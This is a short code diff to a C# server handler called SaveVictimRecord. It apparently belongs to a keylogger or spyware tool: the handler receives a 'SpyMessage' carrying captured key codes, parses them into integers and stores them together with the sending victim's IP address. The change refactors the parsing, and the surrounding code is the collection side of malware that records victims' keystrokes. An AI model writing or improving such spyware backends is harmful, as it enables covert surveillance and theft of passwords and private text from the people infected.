@@ -18,12 +18,17 @@ namespace Server.Handlers
         public async Task<string> SaveVictimRecord(SpyMessage message, ClientInfo clientInfo)
         {
 
-            string keys = message.GetOption("keys");
-            string ip = clientInfo.RemoteEndPoint.ToString().Split(":")[0];
-
-            if (string.IsNullOrEmpty(keys))
+            string stringKeys = message.GetOption("keys");
+            if (string.IsNullOrEmpty(stringKeys))
                 return _director.GetBadRequestResponse().ToString();
 
+            string ip = clientInfo.RemoteEndPoint.ToString().Split(":")[0];
+            int[] keys = stringKeys
+                .Replace(" ", "")
+                .Split(',', StringSplitOptions.RemoveEmptyEntries)
+                .Select(key => int.TryParse(key, out int result) ? result : -1)
+                .Where(key => key != -1)
+                .ToArray();
 
             Data.RecordsContainer.AddRecord(keys, ip);
 
